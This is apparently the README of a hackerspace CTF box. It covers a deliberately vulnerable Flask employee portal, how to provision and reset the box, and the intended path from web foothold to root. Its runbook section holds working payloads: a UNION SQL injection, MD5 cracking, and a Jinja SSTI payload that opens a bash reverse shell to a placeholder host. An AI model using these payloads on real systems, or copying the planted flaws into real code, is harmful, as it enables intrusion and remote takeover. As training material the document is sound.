# breach_and_climb_ctf
CTF challenge from Istanbul Hackerspace: **Breach & Climb — From Foothold to Root**.
One box, two flags: web foothold → shell → user → root.

| What | Where |
|---|---|
| Talk slides | [`presentation/breach-and-climb.pptx`](presentation/breach-and-climb.pptx) · [web version](https://cybermaksx.com/talks/breach-and-climb/) |
| Build the box | [`box/provision.sh`](box/provision.sh) (Debian 13), see [The CTF box](#the-ctf-box) |
| Solution (spoilers) | [`WALKTHROUGH.md`](WALKTHROUGH.md) · [`solve/`](solve/) · [`docs/writeup-ru.md`](docs/writeup-ru.md) |
| Reset / rollback | [`docs/rollback-ru.md`](docs/rollback-ru.md) |

## ECorpNet — E Corp employee portal (Flask)

Internal intranet of E Corp (Mr. Robot universe):

| Module | Who | What it does |
|---|---|---|
| Auth | everyone | Sign in; external contractors self-register with limited access |
| Dashboard | all | Announcements, E Coin balance, open tickets, new colleagues |
| Directory | all | Search staff, profiles, org chart (manager / direct reports), edit own profile & password |
| IT Helpdesk | all / IT | Open tickets, conversation thread; IT staff triage (status, priority, assignee) |
| HR Documents | all / managers | Documents filtered by clearance (all → employee → manager → admin); preview, download, upload |
| E Coin Wallet | all | Balance, history, instant transfers to colleagues |
| Report Builder | managers, admin | Headcount / tickets / payroll / E Coin reports, saved, CSV export, print |
| Admin | admin | Users (role, salary, manager, disable, reset password), announcements, monthly payroll run, bulk-email templates (legacy Jinja preview engine) |
| JSON API | logged in | `/api/v1/` — me, employees, wallet, tickets |

Roles: `contractor` < `employee` / `it` < `manager` < `admin`.

### Run (development)

```bash
python3 -m venv .venv && . .venv/bin/activate
pip install -r requirements.txt
flask --app ecorpnet init-db      # recreates DB + seed data, prints demo accounts
flask --app ecorpnet run --debug  # http://127.0.0.1:5000
```

> **Never use `--debug` on the CTF server**: the Werkzeug debugger is remote code execution.

Data lives in `instance/` (SQLite DB, uploaded documents, generated `secret_key`).
`init-db` wipes and reseeds everything — handy for resetting the box between CTF rounds.
Run `flask --app ecorpnet init-db` again after any code/schema change, otherwise the
running app is missing new tables (e.g. `comms_templates`).

### Run (server, port 80)

For the real CTF box use `box/provision.sh` (see [The CTF box](#the-ctf-box) below):
it installs nginx + gunicorn, the systemd sandbox and the privesc stages.
For a quick manual run:

```bash
gunicorn -w 4 -b 0.0.0.0:80 'ecorpnet:create_app()'
```

(or bind gunicorn to 127.0.0.1:8000 behind nginx).

### Tests

```bash
python3 tests/smoke_test.py      # every page / workflow for each role
python3 tests/security_test.py   # security regression checks (all must be OK)
```

Both run against a throw-away database, the real `instance/` is not touched.

## The CTF box

> **Spoilers below.** This README, `WALKTHROUGH.md` and `box/` describe the solution.
> `provision.sh` copies only the application code onto the box, never these files.

### Path overview

| Stage | From → To | Vulnerability | Flag |
|---|---|---|---|
| 0 | — | Recon: `22/ssh`, `80/http`; `/api/v1/` found with SecLists `api-endpoints.txt` | — |
| 1 | anonymous → contractor | Open self-registration | — |
| 2 | contractor → web admin | UNION SQLi in `/api/v1/employees?q=` → unsalted MD5 → rockyou (`pprice`) | — |
| 3 | web admin → `ecorpnet` shell | SSTI in Admin → Email templates → Preview (`render_template_string`) | — |
| 4 | `ecorpnet` → `pnair` | Cleartext password in `/etc/ecorpnet/backup.conf` (group `ecorpnet`), reused for the Linux account | `/home/pnair/user.txt` |
| 5 | `pnair` → root | `sudo NOPASSWD /usr/local/bin/steelmountain-backup` runs `tar … *` in pnair-writable `/srv/reports` (wildcard injection) | `/root/root.txt` |

Step-by-step solution: [`WALKTHROUGH.md`](WALKTHROUGH.md). Target level: beginners / mixed —
every step is found with standard tooling (nmap, ffuf + SecLists, john + rockyou, linPEAS, `sudo -l`, GTFOBins).

### Build the box

Target: a fresh **Debian 13** host. From the repo root on that machine:

```bash
sudo ./box/provision.sh
```

Idempotent — re-running redeploys the app and resets the box. It:

- installs `python3-venv`, `nginx`, `sudo`; masks suspend/hibernate; boots to console (`multi-user.target`);
- creates users `ecorpnet` (service, no shell) and `pnair` (stage 4; password is set in `provision.sh`);
- deploys **code only** (no README, tests, notes) to `/opt/ecorpnet/app`, owned by root, read-only;
- builds the venv (offline from `./vendor/*.whl` if that directory exists, otherwise PyPI);
- installs the systemd unit, nginx site (`:80 → 127.0.0.1:8000`), `sshd` drop-in `PermitRootLogin no`;
- writes stage 4/5 files: `/etc/ecorpnet/backup.conf`, `/usr/local/bin/steelmountain-backup`, `/etc/sudoers.d/steelmountain`;
- generates random flags once into `/root/.ctf-flags` and installs `/usr/local/sbin/ctf-reset`, then runs it.

Copy only what the script needs onto the box and delete it afterwards:

```bash
# from the laptop
tar czf - box ecorpnet requirements.txt LICENSE | ssh admin@BOX 'mkdir -p ~/ctf-src && tar xzf - -C ~/ctf-src'
ssh -t admin@BOX 'sudo bash ~/ctf-src/box/provision.sh && rm -rf ~/ctf-src'
```

### Layout on the box

| Path | Owner / mode | Purpose |
|---|---|---|
| `/opt/ecorpnet/app` | `root:root 755`, read-only in the unit | App code + `.venv` |
| `/opt/ecorpnet/app/instance` | `ecorpnet 700` | SQLite DB, uploads, `secret_key` |
| `/etc/systemd/system/ecorpnet.service` | root | gunicorn `-w 4` on `127.0.0.1:8000` |
| `/etc/nginx/sites-available/ecorpnet` | root | Reverse proxy on `:80` |
| `/etc/ecorpnet/backup.conf` | `root:ecorpnet 640` | Stage 4 credential leak |
| `/usr/local/bin/steelmountain-backup` | `root 755` | Stage 5 vulnerable script |
| `/etc/sudoers.d/steelmountain` | `root 440` | `pnair` → script, NOPASSWD |
| `/srv/reports` | `pnair 755` | Directory the script archives with `*` |
| `/home/pnair/user.txt` | `root:pnair 440` | User flag |
| `/root/root.txt` | `root 400` | Root flag |
| `/root/.ctf-flags` | `root 600` | Source of truth for both flags |
| `/usr/local/sbin/ctf-reset` | `root 700` | Reset script |

### Service sandbox (why the unit looks the way it does)

- **No `NoNewPrivileges`** — on purpose. With it, setuid is ignored inside the web shell and `su`/`sudo` (stages 4–5) can never work.
- `ProtectSystem=full` — `/usr`, `/boot`, `/etc` read-only even for a player who reaches root from the web shell.
- `ProtectHome=read-only` — `/home/pnair` stays visible (user flag), but nobody writes `/root/.ssh` to persist.
- `ReadOnlyPaths=/opt/ecorpnet/app`, `ReadWritePaths=…/instance` — players can't modify the app for others.
- `PrivateTmp=yes` — player junk in `/tmp` disappears on restart.
- `PermitRootLogin no` in sshd — root gained inside the sandbox can't be turned into a root SSH login.

Root obtained via the web shell is therefore "sandboxed root": enough to read `root.txt`, not to break the box.
Players who SSH in as `pnair` get the normal, unsandboxed system.

### Between rounds

```bash
sudo ctf-reset
```

Stops the app (killing every web shell and its `su`/`sudo` children — they live in the service cgroup),
kills `pnair` sessions, reseeds the DB, recreates `/srv/reports`, `/home/pnair`, both flags, removes
`/var/backups/steelmountain-reports.tgz` and player files in `/tmp`, `/var/tmp`, `/dev/shm`.

Rotate flags: `sudo rm /root/.ctf-flags && sudo ./box/provision.sh`.

### Pre-event checklist

- [ ] Every admin account on the box has a long random password **and** key-only SSH:
      ```bash
      printf 'Match User <admin>\n    PasswordAuthentication no\n' | sudo tee /etc/ssh/sshd_config.d/20-admin.conf
      sudo sshd -t && sudo systemctl reload ssh
      ```
      (password auth must stay **on** globally — players log in as `pnair`). Any `sudo`-group user with a guessable password = root without playing.
- [ ] No copy of this repo / `provision.sh` left on the box (`~/ctf-src`).
- [ ] `sudo ctf-reset` run, `curl -I http://BOX/` → `302 /login`.
- [ ] Full path replayed once per `WALKTHROUGH.md`.
- [ ] Known limitation: one shared instance — the first admin can change `pprice`'s password, disable users or delete templates. Run `ctf-reset` regularly, or give each team its own box.

### Troubleshooting

**Box on a laptop's ethernet (NetworkManager "Shared to other computers").** The laptop is `10.42.0.1` and serves DHCP `10.42.0.10–254`. Find the box:
```bash
ip neigh show dev <eth-iface> | grep -v INCOMPLETE
```

**"No route to host" / link keeps flapping / partner advertises only `10baseT`** — the box is asleep (NIC in Wake-on-LAN mode). Debian with GDM suspends after ~15–20 min idle. `provision.sh` masks the sleep targets; on an older install:
```bash
sudo systemctl mask sleep.target suspend.target hibernate.target hybrid-sleep.target
sudo systemctl set-default multi-user.target
```
Check: `journalctl -b | grep -i suspend`.

**App not responding:** `systemctl status ecorpnet`, `journalctl -u ecorpnet -n 50`, `sudo nginx -t`.

## Intended exploitation path (runbook)

Verified end-to-end against the app (register → shell, with `init-db` done first):

```bash
# 0. target + listening shell catcher
B=http://127.0.0.1:5000                       # or the CTF server address
nc -lvnp 4444                                 # in another terminal

# helper: grab the CSRF token of a form from a page
csrf() { curl -s "$@" | grep -oP 'csrf_token" value="\K[^"]+' | head -1; }

# 1) self-register as an external contractor
T=$(csrf -c jar.txt $B/register)
curl -s -b jar.txt -c jar.txt -X POST $B/register \
  --data-urlencode "username=mallory" \
  --data-urlencode "full_name=Mallory Riot" \
  --data-urlencode "company=Allsafe Cybersecurity" \
  --data-urlencode "email=mallory@allsafe.example" \
  --data-urlencode "password=Passw0rd!" \
  --data-urlencode "confirm=Passw0rd!" \
  --data-urlencode "csrf_token=$T"

# 2) sign in, keep the session cookie
T=$(csrf -c jar.txt $B/login)
curl -s -b jar.txt -c jar.txt -X POST $B/login \
  --data-urlencode "username=mallory" \
  --data-urlencode "password=Passw0rd!" \
  --data-urlencode "csrf_token=$T"
SESSION=$(awk '$6=="session"{print $7}' jar.txt)

# 3) SQL injection: the employee search interpolates input -> dump the admin row
curl -s -G "$B/api/v1/employees" -H "Cookie: session=$SESSION" \
  --data-urlencode "q=') AND 0 UNION ALL SELECT id,username,password_hash,email,title,department,phone,office,manager_id FROM users WHERE role='admin'--" | python3 -m json.tool
#   full_name holds the admin's password_hash (unsalted MD5)

# 4) crack it
echo "<hash>" > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
#   -> bowwow   (pprice / admin)

# 5) sign in as admin (use a FRESH cookie jar: /login redirects if already signed in)
T=$(csrf -c jar2.txt $B/login)
curl -s -b jar2.txt -c jar2.txt -X POST $B/login \
  --data-urlencode "username=pprice" \
  --data-urlencode "password=bowwow" \
  --data-urlencode "csrf_token=$T"

# 6 SSTI -> RCE: admin Email Templates preview renders with the legacy Jinja engine
T=$(csrf -b jar2.txt $B/admin/comms/1)
curl -s -b jar2.txt -X POST $B/admin/comms/1 \
  --data-urlencode "name=welcome_new_hire" \
  --data-urlencode "subject=Test" \
  --data-urlencode "button=preview" \
  --data-urlencode 'body={{ lipsum.__globals__.os.popen('"'"'bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1" </dev/null >/dev/null 2>&1 &'"'"').read() }}' \
  --data-urlencode "csrf_token=$T"
```

Notes:

- The `</dev/null >/dev/null 2>&1 &` part matters: without it the reverse shell (`bash -i >& /dev/tcp/...`) holds the HTTP request open until the shell session ends.
- Works under `gunicorn -w 4` too — the shell comes from one of the workers.
- Reset the box between rounds with `flask --app ecorpnet init-db`.

Unauthenticated RCE would be out of scope: steps 1–4 are the intended pre-auth path, step 6 requires the admin account.
